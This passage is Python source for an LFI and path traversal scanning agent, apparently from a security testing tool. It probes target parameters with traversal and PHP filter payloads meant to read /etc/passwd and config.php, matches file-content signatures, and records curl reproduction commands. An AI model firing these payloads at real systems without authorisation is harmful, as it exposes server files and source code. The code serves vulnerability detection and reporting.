import logging
import aiohttp
from typing import Dict, List, Optional, Any, Tuple
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from bugtrace.agents.base import BaseAgent
from bugtrace.agents.worker_pool import WorkerPool, WorkerConfig
from bugtrace.core.ui import dashboard
from bugtrace.core.event_bus import EventType
from bugtrace.core.config import settings
from bugtrace.tools.external import external_tools
from bugtrace.core.http_orchestrator import orchestrator, DestinationType
from bugtrace.reporting.standards import (
    get_cwe_for_vuln,
    get_remediation_for_vuln,
    normalize_severity,
)
from bugtrace.core.validation_status import ValidationStatus, requires_cdp_validation
from bugtrace.core.verbose_events import create_emitter

# v3.2.0: Import TechContextMixin for context-aware detection
from bugtrace.agents.mixins.tech_context import TechContextMixin

logger = logging.getLogger(__name__)

class LFIAgent(BaseAgent, TechContextMixin):
    """
    Specialist Agent for Local File Inclusion (LFI) and Path Traversal.
    """

    def __init__(self, url: str, params: List[str] = None, report_dir: Path = None, event_bus=None):
        super().__init__(
            name="LFIAgent",
            role="LFI Specialist",
            event_bus=event_bus,
            agent_id="lfi_agent"
        )
        self.url = url
        self.params = params or []
        self.report_dir = report_dir or Path("./reports")

        # Deduplication
        self._tested_params = set()

        # Queue consumption mode (Phase 20)
        self._queue_mode = False

        # Expert deduplication: Track emitted findings by fingerprint
        self._emitted_findings: set = set()  # (url, param)
        self._worker_pool: Optional[WorkerPool] = None
        self._scan_context: str = ""

        # WET → DRY transformation (Two-phase processing)
        self._dry_findings: List[Dict] = []  # Dedup'd findings after Phase A

        # v3.2.0: Context-aware tech stack (loaded in start_queue_consumer)
        self._tech_stack_context: Dict = {}
        self._lfi_prime_directive: str = ""

    # =========================================================================
    # FINDING VALIDATION: LFI-specific validation (Phase 1 Refactor)
    # =========================================================================

    def _validate_before_emit(self, finding: Dict) -> Tuple[bool, str]:
        """
        LFI-specific validation before emitting finding.

        Validates:
        1. Basic requirements (type, url) via parent
        2. Has file content evidence OR path traversal confirmation
        3. Payload contains path traversal patterns
        """
        # Call parent validation first
        is_valid, error = super()._validate_before_emit(finding)
        if not is_valid:
            return False, error

        # Extract from nested structure if needed
        nested = finding.get("finding", {})
        evidence = finding.get("evidence", {})
        status = finding.get("status", nested.get("status", ""))

        # LFI-specific: Must have confirmation or status indicating validation
        if status not in ["VALIDATED_CONFIRMED", "PENDING_VALIDATION"]:
            has_content = evidence.get("file_content") or evidence.get("signature_found")
            has_interactsh = evidence.get("interactsh_callback")
            if not (has_content or has_interactsh):
                return False, "LFI requires proof: file content signature or Interactsh callback"

        # LFI-specific: Payload should contain path traversal patterns
        payload = finding.get("payload", nested.get("payload", ""))
        lfi_markers = ['../', '..\\', 'etc/passwd', 'win.ini', 'php://', 'file://', '%2e%2e']
        if payload and not any(m in str(payload).lower() for m in lfi_markers):
            return False, f"LFI payload missing path traversal patterns: {payload[:50]}"

        return True, ""

    def _emit_lfi_finding(self, finding_dict: Dict, scan_context: str = None) -> Optional[Dict]:
        """
        Helper to emit LFI finding using BaseAgent.emit_finding() with validation.
        """
        if "type" not in finding_dict:
            finding_dict["type"] = "LFI"

        if scan_context:
            finding_dict["scan_context"] = scan_context

        finding_dict["agent"] = self.name
        return self.emit_finding(finding_dict)

    def _determine_validation_status(self, response_text: str, payload: str) -> str:
        """
        Determine validation status based on what we actually found.

        TIER 1 (VALIDATED_CONFIRMED):
            - /etc/passwd content visible (root:x:0:0)
            - win.ini content visible ([extensions])
            - PHP source code visible (<?php or base64 decoded PHP)

        TIER 2 (PENDING_VALIDATION):
            - Path traversal success but no sensitive file content
            - PHP wrapper returned something but unclear if source code
        """
        # TIER 1: Clear sensitive file signatures
        tier1_signatures = [
            "root:x:0:0",           # /etc/passwd Linux
            "root:*:0:0",           # /etc/passwd BSD
            "[extensions]",         # win.ini
            "[fonts]",              # win.ini
            "127.0.0.1 localhost",  # /etc/hosts
            "<?php",                # PHP source code (direct)
        ]

        for sig in tier1_signatures:
            if sig in response_text:
                logger.info(f"[{self.name}] Found '{sig}' in response. VALIDATED_CONFIRMED")
                return "VALIDATED_CONFIRMED"

        # TIER 1: Base64 decoded PHP (from php://filter)
        if "PD9waH" in response_text:  # Base64 for <?php
            logger.info(f"[{self.name}] Found base64 PHP source. VALIDATED_CONFIRMED")
            return "VALIDATED_CONFIRMED"

        # TIER 2: Path traversal worked but didn't get sensitive content
        # This could be a directory listing or error page
        logger.info(f"[{self.name}] LFI response unclear. PENDING_VALIDATION")
        return "PENDING_VALIDATION"

    async def _get_response_text(self, session, payload, param) -> str:
        """Get the response text for classification."""
        target_url = self._inject_payload(self.url, param, payload)
        try:
            async with session.get(target_url, timeout=5) as resp:
                return await resp.text()
        except Exception as e:
            logger.debug(f"_get_response_text failed: {e}")
            return ""
        
    def _create_lfi_finding_from_hit(self, hit: Dict, param: str) -> Dict:
        """Create LFI finding from fuzzer hit."""
        return {
            "type": "LFI / Path Traversal",
            "url": self.url,
            "parameter": param,
            "payload": hit["payload"],
            "description": f"Local File Inclusion success: Found {hit['file_found']}. File content leaked in response.",
            "severity": normalize_severity(hit["severity"]).value,  # Normalize to uppercase
            "cwe_id": get_cwe_for_vuln("LFI"),  # CWE-22
            "cve_id": "N/A",  # LFI vulnerabilities are class-based, not specific CVEs
            "remediation": get_remediation_for_vuln("LFI"),
            "validated": True,
            "status": "VALIDATED_CONFIRMED",
            "evidence": hit["evidence"],
            "http_request": f"GET {self.url}?{param}={hit['payload']}",
            "http_response": hit["evidence"][:500] if isinstance(hit["evidence"], str) else str(hit["evidence"])[:500],
            "reproduction": f"curl '{self.url}?{param}={hit['payload']}'"
        }

    def _create_lfi_finding_from_wrapper(self, payload: str, param: str, response_text: str) -> Dict:
        """Create LFI finding from PHP wrapper test."""
        return {
            "type": "LFI / Path Traversal",
            "url": self.url,
            "parameter": param,
            "payload": payload,
            "description": f"LFI detected via PHP wrapper. Source code can be read using base64 encoding filter.",
            "severity": normalize_severity("CRITICAL").value,
            "cwe_id": get_cwe_for_vuln("LFI"),  # CWE-22
            "cve_id": "N/A",  # LFI vulnerabilities are class-based, not specific CVEs
            "remediation": get_remediation_for_vuln("LFI"),
            "validated": True,
            "evidence": f"PHP Wrapper matched signature after injecting {payload}",
            "status": self._determine_validation_status(response_text, payload),
            "http_request": f"GET {self.url}?{param}={payload}",
            "http_response": response_text[:500],
            "reproduction": f"curl '{self.url}?{param}={payload}' | base64 -d"
        }

    async def _test_php_wrappers(self, session, param: str) -> Optional[Dict]:
        """Test PHP wrapper payloads as fallback."""
        base_payloads = [
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=config.php"
        ]

        for p in base_payloads:
            dashboard.update_task(f"LFI:{param}", status=f"Testing Wrapper {p[:20]}...")
            if await self._test_payload(session, p, param):
                response_text = await self._get_response_text(session, p, param)
                return self._create_lfi_finding_from_wrapper(p, param, response_text)
        return None

    async def run_loop(self) -> Dict:
        """Main execution loop for LFI testing."""
        dashboard.current_agent = self.name
        dashboard.log(f"[{self.name}] 🚀 Starting LFI analysis on {self.url}", "INFO")

        all_findings = []
        async with orchestrator.session(DestinationType.TARGET) as session:
            for param in self.params:
                logger.info(f"[{self.name}] Testing LFI on {self.url} (param: {param})")

                key = f"{self.url}#{param}"
                if key in self._tested_params:
                    logger.info(f"[{self.name}] Skipping {param} - already tested")
                    continue

                await self._test_parameter_for_lfi(session, param, key, all_findings)

        return {"vulnerable": len(all_findings) > 0, "findings": all_findings}

    async def _test_parameter_for_lfi(self, session, param: str, key: str, all_findings: List):
        """Test a single parameter for LFI vulnerabilities."""
        # High-Performance Go Fuzzer
        dashboard.log(f"[{self.name}] 🚀 Launching Go LFI Fuzzer on '{param}'...", "INFO")
        go_result = await external_tools.run_go_lfi_fuzzer(self.url, param)

        if go_result and go_result.get("hits"):
            self._process_go_fuzzer_hits(go_result, param, key, all_findings)
            return

        # Base Payloads (Manual Fallback if Go fails or for PHP wrappers)
        if key not in self._tested_params:
            wrapper_finding = await self._test_php_wrappers(session, param)
            if wrapper_finding:
                all_findings.append(wrapper_finding)
                self._tested_params.add(key)

    def _process_go_fuzzer_hits(self, go_result: Dict, param: str, key: str, all_findings: List):
        """Process Go fuzzer hits and add to findings."""
        for hit in go_result["hits"]:
            dashboard.log(f"[{self.name}] 🚨 LFI HIT: {hit['payload']} ({hit['severity']})", "CRITICAL")
            all_findings.append(self._create_lfi_finding_from_hit(hit, param))
            self._tested_params.add(key)
            break

    async def _test_payload(self, session, payload, param) -> bool:
        """Injects payload and analyzes response."""
        target_url = self._inject_payload(self.url, param, payload)
        
        try:
            async with session.get(target_url, timeout=5) as resp:
                text = await resp.text()
                
                # Heuristics for detection
                signatures = [
                    "root:x:0:0",                  # /etc/passwd
                    "[extensions]",                # win.ini
                    "[fonts]",                     # win.ini
                    "PD9waH",                      # Base64 for <?php
                    "root:*:0:0",                  # /etc/passwd (other formats)
                    "127.0.0.1 localhost"         # /etc/hosts
                ]

                if any(sig in text for sig in signatures):
                    if hasattr(self, '_v'):
                        matched = next((s for s in signatures if s in text), "")
                        self._v.emit("exploit.specialist.signature_match", {"agent": "LFI", "param": param, "payload": payload[:100], "signature": matched, "method": "payload_test"})
                    return True

        except Exception as e:
            logger.debug(f"Path traversal signature check failed: {e}")

        return False

    def _inject_payload(self, url, param, payload):
        parsed = urlparse(url)
        q = parse_qs(parsed.query)
        q[param] = [payload]
        new_query = urlencode(q, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

    # =========================================================================
    # Queue Consumption Mode (Phase 20) - WET→DRY
    # =========================================================================

    async def analyze_and_dedup_queue(self) -> List[Dict]:
        """Phase A: Global analysis of WET list with LLM-powered deduplication."""
        import asyncio
        import time
        from bugtrace.core.queue import queue_manager

        logger.info(f"[{self.name}] ===== PHASE A: Analyzing WET list =====")

        queue = queue_manager.get_queue("lfi")
        wet_findings = []

        wait_start = time.monotonic()
        max_wait = 300.0

        while (time.monotonic() - wait_start) < max_wait:
            depth = queue.depth() if hasattr(queue, 'depth') else 0
            if depth > 0:
                logger.info(f"[{self.name}] Phase A: Queue has {depth} items, starting drain...")
                break
            await asyncio.sleep(0.5)
        else:
            return []

        empty_count = 0
        max_empty_checks = 10

        while empty_count < max_empty_checks:
            item = await queue.dequeue(timeout=0.5)
            if item is None:
                empty_count += 1
                await asyncio.sleep(0.5)
                continue

            empty_count = 0
            finding = item.get("finding", {})
            url = finding.get("url", "")
            parameter = finding.get("parameter", "")

            if url and parameter:
                wet_findings.append({
                    "url": url,
                    "parameter": parameter,
                    "finding": finding,
                    "scan_context": item.get("scan_context", self._scan_context)
                })

        logger.info(f"[{self.name}] Phase A: Drained {len(wet_findings)} WET findings from queue")

        if not wet_findings:
            return []

        # ARCHITECTURE: ALWAYS keep original WET params + ADD discovered params
        logger.info(f"[{self.name}] Phase A: Expanding WET findings with LFI-focused discovery...")
        expanded_wet_findings = []
        seen_urls = set()
        seen_params = set()

        # 1. Always include ALL original WET params first (DASTySAST signals)
        for wet_item in wet_findings:
            url = wet_item.get("url", "")
            param = wet_item.get("parameter", "") or (wet_item.get("finding", {}) or {}).get("parameter", "")
            if param and (url, param) not in seen_params:
                seen_params.add((url, param))
                expanded_wet_findings.append(wet_item)

        # 2. Discover additional params per unique URL
        for wet_item in wet_findings:
            url = wet_item.get("url", "")
            if url in seen_urls:
                continue
            seen_urls.add(url)

            try:
                all_params = await self._discover_lfi_params(url)
                if not all_params:
                    continue

                new_count = 0
                for param_name, param_value in all_params.items():
                    if (url, param_name) not in seen_params:
                        seen_params.add((url, param_name))
                        expanded_wet_findings.append({
                            "url": url,
                            "parameter": param_name,
                            "finding": wet_item.get("finding", {}),
                            "scan_context": wet_item.get("scan_context", self._scan_context),
                            "_discovered": True
                        })
                        new_count += 1

                if new_count:
                    logger.info(f"[{self.name}] 🔍 Discovered {new_count} additional params on {url}")

            except Exception as e:
                logger.error(f"[{self.name}] Discovery failed for {url}: {e}")

        # 2.5 Resolve endpoint URLs from HTML links/forms + reasoning fallback
        from bugtrace.agents.specialist_utils import resolve_param_endpoints, resolve_param_from_reasoning
        if hasattr(self, '_last_discovery_html') and self._last_discovery_html:
            for base_url in seen_urls:
                endpoint_map = resolve_param_endpoints(self._last_discovery_html, base_url)
                # Fallback: extract endpoints from DASTySAST reasoning text
                reasoning_map = resolve_param_from_reasoning(expanded_wet_findings, base_url)
                for k, v in reasoning_map.items():
                    if k not in endpoint_map:
                        endpoint_map[k] = v
                if endpoint_map:
                    resolved_count = 0
                    for item in expanded_wet_findings:
                        if item.get("url") == base_url:
                            param = item.get("parameter", "")
                            if param in endpoint_map and endpoint_map[param] != base_url:
                                item["url"] = endpoint_map[param]
                                resolved_count += 1
                    if resolved_count:
                        logger.info(f"[{self.name}] 🔗 Resolved {resolved_count} params to actual endpoint URLs")

        logger.info(f"[{self.name}] Phase A: Expanded {len(wet_findings)} hints → {len(expanded_wet_findings)} testable params")

        # Now deduplicate the expanded list
        try:
            dry_list = await self._llm_analyze_and_dedup(expanded_wet_findings, self._scan_context)
        except Exception as e:
            logger.error(f"[{self.name}] LLM dedup failed: {e}. Falling back to fingerprint dedup")
            dry_list = self._fallback_fingerprint_dedup(expanded_wet_findings)

        self._dry_findings = dry_list
        dup_count = len(expanded_wet_findings) - len(dry_list)
        logger.info(f"[{self.name}] Phase A: {len(expanded_wet_findings)} WET → {len(dry_list)} DRY ({dup_count} duplicates removed)")

        return dry_list

    async def _llm_analyze_and_dedup(self, wet_findings: List[Dict], context: str) -> List[Dict]:
        """LLM-powered intelligent deduplication."""
        from bugtrace.core.llm_client import llm_client
        import json

        # v3.2: Extract tech stack info for prompt
        tech_stack = getattr(self, '_tech_stack_context', {}) or {}
        lang = tech_stack.get('lang', 'generic')
        server = tech_stack.get('server', 'generic')
        waf = tech_stack.get('waf')

        # Get LFI-specific context prompts
        lfi_prime_directive = getattr(self, '_lfi_prime_directive', '')
        lfi_dedup_context = self.generate_lfi_dedup_context(tech_stack) if tech_stack else ''

        # Infer OS for context
        os_type = self._infer_os_from_stack(tech_stack)

        prompt = f"""You are analyzing {len(wet_findings)} potential LFI findings.

{lfi_prime_directive}

{lfi_dedup_context}

## TARGET CONTEXT
- Language: {lang}
- Server: {server}
- Likely OS: {os_type}
- WAF: {waf or 'None'}

WET LIST:
{json.dumps(wet_findings, indent=2)}

Return JSON array of UNIQUE findings only:
{{"findings": [...]}}
"""

        system_prompt = f"""You are an expert security analyst specializing in LFI deduplication.

{lfi_prime_directive}

Focus on parameter+file deduplication. Same file via different traversal depths = DUPLICATE."""

        response = await llm_client.generate(
            prompt=prompt,
            system_prompt=system_prompt,
            module_name="LFI_DEDUP",
            temperature=0.2
        )

        try:
            result = json.loads(response)
            return result.get("findings", wet_findings)
        except json.JSONDecodeError:
            logger.warning(f"[{self.name}] LLM returned invalid JSON, using fallback")
            return self._fallback_fingerprint_dedup(wet_findings)

    def _fallback_fingerprint_dedup(self, wet_findings: List[Dict]) -> List[Dict]:
        """Fallback fingerprint-based deduplication."""
        seen_fingerprints = set()
        dry_list = []

        for finding_data in wet_findings:
            url = finding_data.get("url", "")
            parameter = finding_data.get("parameter", "")

            if not url or not parameter:
                continue

            fingerprint = self._generate_lfi_fingerprint(url, parameter)

            if fingerprint not in seen_fingerprints:
                seen_fingerprints.add(fingerprint)
                dry_list.append(finding_data)

        return dry_list

    async def exploit_dry_list(self) -> List[Dict]:
        """Phase B: Exploit DRY list."""
        logger.info(f"[{self.name}] ===== PHASE B: Exploiting DRY list =====")
        logger.info(f"[{self.name}] Phase B: Exploiting {len(self._dry_findings)} DRY findings...")

        validated_findings = []

        for idx, finding_data in enumerate(self._dry_findings, 1):
            url = finding_data.get("url", "")
            parameter = finding_data.get("parameter", "")
            finding = finding_data.get("finding", {})

            logger.info(f"[{self.name}] Phase B [{idx}/{len(self._dry_findings)}]: Testing {url}?{parameter}")

            if hasattr(self, '_v'):
                self._v.emit("exploit.specialist.param.started", {"agent": "LFI", "param": parameter, "url": url, "idx": idx, "total": len(self._dry_findings)})
                self._v.reset("exploit.specialist.progress")

            try:
                self.url = url
                result = await self._test_single_param_from_queue(url, parameter, finding)

                if result and result.get("validated"):
                    validated_findings.append(result)

                    fingerprint = self._generate_lfi_fingerprint(url, parameter)

                    if fingerprint not in self._emitted_findings:
                        self._emitted_findings.add(fingerprint)

                        if hasattr(self, '_v'):
                            self._v.emit("exploit.specialist.confirmed", {"agent": "LFI", "param": parameter, "url": url, "payload": result.get("payload", "")[:100], "status": result.get("status", "")})

                        if settings.WORKER_POOL_EMIT_EVENTS:
                            status = result.get("status", ValidationStatus.VALIDATED_CONFIRMED.value)
                            self._emit_lfi_finding({
                                "specialist": "lfi",
                                "type": "LFI",
                                "url": result.get("url"),
                                "parameter": result.get("parameter"),
                                "payload": result.get("payload"),
                                "status": status,
                                "evidence": result.get("evidence", {}),
                                "validation_requires_cdp": status == ValidationStatus.PENDING_VALIDATION.value,
                            }, scan_context=self._scan_context)

                        logger.info(f"[{self.name}] ✅ Emitted unique finding: {url}?{parameter}")
                    else:
                        logger.debug(f"[{self.name}] ⏭️  Skipped duplicate: {fingerprint}")

            except Exception as e:
                logger.error(f"[{self.name}] Phase B [{idx}/{len(self._dry_findings)}]: Attack failed: {e}")
                continue
            finally:
                if hasattr(self, '_v'):
                    self._v.emit("exploit.specialist.param.completed", {"agent": "LFI", "param": parameter, "url": url, "idx": idx})

        logger.info(f"[{self.name}] Phase B: Exploitation complete. {len(validated_findings)} validated findings")

        return validated_findings

    async def _generate_specialist_report(self, findings: List[Dict]) -> str:
        """Generate specialist report."""
        import json
        import aiofiles
        from datetime import datetime
        from bugtrace.core.config import settings

        # v3.1: Use unified report_dir if injected, else fallback to scan_context
        scan_dir = getattr(self, 'report_dir', None)
        if not scan_dir:
            scan_id = self._scan_context.split("/")[-1]
            scan_dir = settings.BASE_DIR / "reports" / scan_id
        # v3.2: Write to specialists/results/ for unified wet→dry→results flow
        results_dir = scan_dir / "specialists" / "results"
        results_dir.mkdir(parents=True, exist_ok=True)

        report = {
            "agent": f"{self.name}",
            "timestamp": datetime.now().isoformat(),
            "scan_context": self._scan_context,
            "phase_a": {
                "wet_count": len(self._dry_findings) + (len(findings) if findings else 0),
                "dry_count": len(self._dry_findings),
                "dedup_method": "llm_with_fingerprint_fallback"
            },
            "phase_b": {
                "validated_count": len([f for f in findings if f.get("validated")]),
                "pending_count": len([f for f in findings if not f.get("validated")]),
                "total_findings": len(findings)
            },
            "findings": findings
        }

        report_path = results_dir / "lfi_results.json"
        async with aiofiles.open(report_path, 'w') as f:
            await f.write(json.dumps(report, indent=2))

        logger.info(f"[{self.name}] Specialist report saved: {report_path}")

        return str(report_path)

    async def start_queue_consumer(self, scan_context: str) -> None:
        """TWO-PHASE queue consumer (WET → DRY). NO infinite loop."""
        from bugtrace.agents.specialist_utils import (
            report_specialist_start,
            report_specialist_done,
            report_specialist_wet_dry,
            write_dry_file,
        )
        from bugtrace.core.queue import queue_manager

        self._queue_mode = True
        self._scan_context = scan_context
        self._v = create_emitter("LFI", self._scan_context)

        # v3.2: Load context-aware tech stack for intelligent deduplication
        await self._load_lfi_tech_context()

        logger.info(f"[{self.name}] Starting TWO-PHASE queue consumer (WET → DRY)")

        # Get initial queue depth for telemetry
        queue = queue_manager.get_queue("lfi")
        initial_depth = queue.depth()
        report_specialist_start(self.name, queue_depth=initial_depth)

        self._v.emit("exploit.specialist.started", {"agent": "LFI", "queue_depth": initial_depth})

        # PHASE A
        logger.info(f"[{self.name}] ===== PHASE A: Analyzing WET list =====")
        dry_list = await self.analyze_and_dedup_queue()

        # Report WET→DRY metrics for integrity verification
        report_specialist_wet_dry(self.name, initial_depth, len(dry_list) if dry_list else 0)
        write_dry_file(self, dry_list, initial_depth, "lfi")

        if not dry_list:
            logger.info(f"[{self.name}] No findings to exploit after deduplication")
            report_specialist_done(self.name, processed=0, vulns=0)
            self._v.emit("exploit.specialist.completed", {"agent": "LFI", "processed": 0, "vulns": 0})
            return

        # PHASE B
        logger.info(f"[{self.name}] ===== PHASE B: Exploiting DRY list =====")
        results = await self.exploit_dry_list()

        # Count confirmed vulnerabilities
        vulns_count = len([r for r in results if r]) if results else 0
        vulns_count += len(self._dry_findings) if hasattr(self, '_dry_findings') else 0

        # REPORTING
        if results or self._dry_findings:
            await self._generate_specialist_report(results)

        # Report completion with final stats
        report_specialist_done(
            self.name,
            processed=len(dry_list),
            vulns=vulns_count
        )

        self._v.emit("exploit.specialist.completed", {"agent": "LFI", "processed": len(dry_list), "vulns": vulns_count})

        logger.info(f"[{self.name}] Queue consumer complete: {len(results)} validated findings")

    async def stop_queue_consumer(self) -> None:
        """Stop queue consumer mode gracefully."""
        if self._worker_pool:
            await self._worker_pool.stop()
            self._worker_pool = None

        if self.event_bus:
            self.event_bus.unsubscribe(
                EventType.WORK_QUEUED_LFI.value,
                self._on_work_queued
            )

        self._queue_mode = False
        logger.info(f"[{self.name}] Queue consumer stopped")

    async def _on_work_queued(self, data: dict) -> None:
        """Handle work_queued_lfi notification (logging only)."""
        logger.debug(f"[{self.name}] Work queued: {data.get('finding', {}).get('url', 'unknown')}")

    async def _process_queue_item(self, item: dict) -> Optional[Dict]:
        """
        Process a single item from the lfi queue.

        Item structure (from ThinkingConsolidationAgent):
        {
            "finding": {
                "type": "LFI",
                "url": "...",
                "parameter": "...",
            },
            "priority": 85.5,
            "scan_context": "scan_123",
            "classified_at": 1234567890.0
        }
        """
        finding = item.get("finding", {})
        url = finding.get("url")
        param = finding.get("parameter")

        if not url or not param:
            logger.warning(f"[{self.name}] Invalid queue item: missing url or parameter")
            return None

        # Configure self for this specific test
        self.url = url

        # Run validation using existing LFI testing logic
        return await self._test_single_param_from_queue(url, param, finding)

    async def _smart_probe_lfi(self, url: str, param: str) -> Tuple[bool, Optional[Dict]]:
        """
        Smart probe: 1-2 requests to test if path traversal causes any behavioral change.

        Sends basic traversal probes and compares against a baseline response.
        - If file content signature found → direct confirmation (return finding)
        - If behavioral change (status/length) → worth investigating (continue)
        - If identical to baseline → skip all heavy testing

        Returns:
            (should_continue, finding_or_none)
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        try:
            async with orchestrator.session(DestinationType.TARGET) as session:
                # Step 1: Get baseline (param with harmless value)
                params[param] = ["btprobe_baseline"]
                baseline_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                           parsed.params, urlencode(params, doseq=True), parsed.fragment))
                async with session.get(baseline_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    baseline_text = await resp.text()
                    baseline_status = resp.status
                    baseline_len = len(baseline_text)

                # Step 2: Send traversal probes
                lfi_signatures = ["root:x:0:0", "root:*:0:0", "[extensions]", "[fonts]",
                                  "127.0.0.1 localhost", "PD9waH"]
                probes = ["../../etc/passwd", "....//....//etc/passwd"]

                for probe in probes:
                    if hasattr(self, '_v'):
                        self._v.progress("exploit.specialist.progress", {"agent": "LFI", "param": param, "payload": probe[:80]}, every=50)
                    params[param] = [probe]
                    probe_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                            parsed.params, urlencode(params, doseq=True), parsed.fragment))

                    async with session.get(probe_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        probe_text = await resp.text()
                        probe_status = resp.status

                        # Direct confirmation: file content signature
                        if any(sig in probe_text for sig in lfi_signatures):
                            if hasattr(self, '_v'):
                                self._v.emit("exploit.specialist.signature_match", {"agent": "LFI", "param": param, "payload": probe[:100], "method": "smart_probe"})
                            dashboard.log(f"[{self.name}] Smart probe: {param} confirmed LFI directly!", "SUCCESS")
                            return True, {
                                "validated": True,
                                "url": url,
                                "parameter": param,
                                "type": "LFI",
                                "payload": probe,
                                "severity": "CRITICAL",
                                "status": ValidationStatus.VALIDATED_CONFIRMED.value,
                                "evidence": {
                                    "method": "smart_probe",
                                    "signature_found": True,
                                    "file_content": probe_text[:500],
                                },
                                "http_request": f"GET {probe_url}",
                            }

                        # Behavioral change: different status or significant length diff
                        if probe_status != baseline_status:
                            dashboard.log(f"[{self.name}] Smart probe: {param} status change ({baseline_status}→{probe_status}), investigating", "INFO")
                            return True, None

                        if abs(len(probe_text) - baseline_len) > 50:
                            dashboard.log(f"[{self.name}] Smart probe: {param} length change ({baseline_len}→{len(probe_text)}), investigating", "INFO")
                            return True, None

                # No change at all
                dashboard.log(f"[{self.name}] Smart probe: {param} no traversal behavior, skipping", "INFO")
                return False, None

        except Exception as e:
            logger.debug(f"[{self.name}] Smart probe error for {param}: {e}")
            return True, None  # On error, continue testing (be safe)

    async def _test_single_param_from_queue(
        self, url: str, param: str, finding: dict
    ) -> Optional[Dict]:
        """
        Test a single parameter from queue for LFI.

        Uses existing validation pipeline optimized for queue processing.
        """
        try:
            # Smart probe: skip if no traversal behavior detected
            should_continue, direct_finding = await self._smart_probe_lfi(url, param)
            if direct_finding:
                return direct_finding
            if not should_continue:
                return None

            # High-Performance Go Fuzzer first
            if hasattr(self, '_v'):
                self._v.emit("exploit.specialist.go_fuzzer", {"agent": "LFI", "param": param, "url": url})
            go_result = await external_tools.run_go_lfi_fuzzer(url, param)
            if go_result and go_result.get("hits"):
                hit = go_result["hits"][0]
                if hasattr(self, '_v'):
                    self._v.emit("exploit.specialist.signature_match", {"agent": "LFI", "param": param, "payload": hit.get("payload", "")[:100], "method": "go_fuzzer"})
                return self._create_lfi_finding_from_hit(hit, param)

            # Fallback to PHP wrappers
            async with orchestrator.session(DestinationType.TARGET) as session:
                wrapper_finding = await self._test_php_wrappers(session, param)
                if wrapper_finding:
                    return wrapper_finding

            return None

        except Exception as e:
            logger.error(f"[{self.name}] Queue item test failed: {e}")
            return None

    def _generate_lfi_fingerprint(self, url: str, parameter: str) -> tuple:
        """
        Generate LFI finding fingerprint for expert deduplication.

        LFI is URL-specific and parameter-specific.

        Args:
            url: Target URL
            parameter: Parameter name

        Returns:
            Tuple fingerprint for deduplication
        """
        from urllib.parse import urlparse

        parsed = urlparse(url)
        normalized_path = parsed.path.rstrip('/')

        # LFI signature: (host, path, parameter)
        fingerprint = ("LFI", parsed.netloc, normalized_path, parameter.lower())

        return fingerprint

    async def _discover_lfi_params(self, url: str) -> Dict[str, str]:
        """
        LFI-focused parameter discovery for a given URL.

        Extracts ALL testable parameters from:
        1. URL query string
        2. HTML forms (input, textarea, select)
        3. Hidden inputs (often contain file paths)
        4. Priority: params with file/path-like names or values

        Returns:
            Dict mapping param names to default values
            Example: {"file": "header.php", "template": "", "page": "home"}

        Architecture Note:
            Specialists must be AUTONOMOUS - they discover their own attack surface.
            The finding from DASTySAST is just a "signal" that the URL is interesting.
            We IGNORE the specific parameter and test ALL discoverable params.
        """
        from bugtrace.tools.visual.browser import browser_manager
        from urllib.parse import urlparse, parse_qs
        from bs4 import BeautifulSoup
        import re

        all_params = {}

        # 1. Extract URL query parameters
        try:
            parsed = urlparse(url)
            url_params = parse_qs(parsed.query)
            for param_name, values in url_params.items():
                all_params[param_name] = values[0] if values else ""
        except Exception as e:
            logger.warning(f"[{self.name}] Failed to parse URL params: {e}")

        # 2. Fetch HTML and extract form parameters
        try:
            state = await browser_manager.capture_state(url)
            html = state.get("html", "")

            if html:
                self._last_discovery_html = html  # Cache for URL resolution
                soup = BeautifulSoup(html, "html.parser")

                # Extract from <input>, <textarea>, <select> with name attribute
                for tag in soup.find_all(["input", "textarea", "select"]):
                    param_name = tag.get("name")
                    if param_name and param_name not in all_params:
                        # For LFI, we DO include hidden inputs (they often contain file paths)
                        input_type = tag.get("type", "text").lower()
                        if input_type not in ["submit", "button", "reset"]:
                            # Skip CSRF tokens
                            if "csrf" not in param_name.lower() and "token" not in param_name.lower():
                                default_value = tag.get("value", "")
                                all_params[param_name] = default_value

                # 3. LFI-specific: Look for params with file-like values
                # Search for input values that look like file paths
                for tag in soup.find_all(["input", "textarea"]):
                    param_name = tag.get("name")
                    value = tag.get("value", "")
                    # If value looks like a file path, prioritize this param
                    if param_name and value and any(ext in value for ext in ['.php', '.html', '.txt', '.xml', '.jsp', '.asp']):
                        all_params[param_name] = value
                        logger.debug(f"[{self.name}] 🎯 Priority param found: {param_name}={value} (file extension detected)")

        except Exception as e:
            logger.warning(f"[{self.name}] Failed to extract HTML params: {e}")

        # 4. LFI-specific prioritization: Sort params to test high-priority ones first
        lfi_priority_names = ['file', 'path', 'template', 'document', 'page', 'include', 'dir', 'folder', 'load', 'read']
        prioritized_params = {}

        # Add high-priority params first
        for priority_name in lfi_priority_names:
            for param_name in list(all_params.keys()):
                if priority_name in param_name.lower():
                    prioritized_params[param_name] = all_params.pop(param_name)

        # Add remaining params
        prioritized_params.update(all_params)

        logger.info(f"[{self.name}] 🔍 Discovered {len(prioritized_params)} params on {url}: {list(prioritized_params.keys())}")

        return prioritized_params

    async def _handle_queue_result(self, item: dict, result: Optional[Dict]) -> None:
        """
        Handle completed queue item processing.

        Emits vulnerability_detected event on confirmed findings.
        Uses centralized validation status to determine if CDP validation is needed.
        """
        if result is None:
            return

        # Use centralized validation status for proper tagging
        # PHP wrapper results may need additional verification if source code not confirmed
        finding_data = {
            "context": result.get("type", "LFI"),
            "payload": result.get("payload", ""),
            "validation_method": "lfi_fuzzer",
            "evidence": {"response": result.get("evidence", "")},
        }
        needs_cdp = requires_cdp_validation(finding_data)

        # LFI-specific edge case: PHP wrapper returned data but can't confirm source code
        payload = result.get("payload", "")
        status = result.get("status", "VALIDATED_CONFIRMED")
        if "php://filter" in payload and status == "PENDING_VALIDATION":
            needs_cdp = True

        # EXPERT DEDUPLICATION: Check if we already emitted this finding
        fingerprint = self._generate_lfi_fingerprint(result.get("url", ""), result.get("parameter", ""))

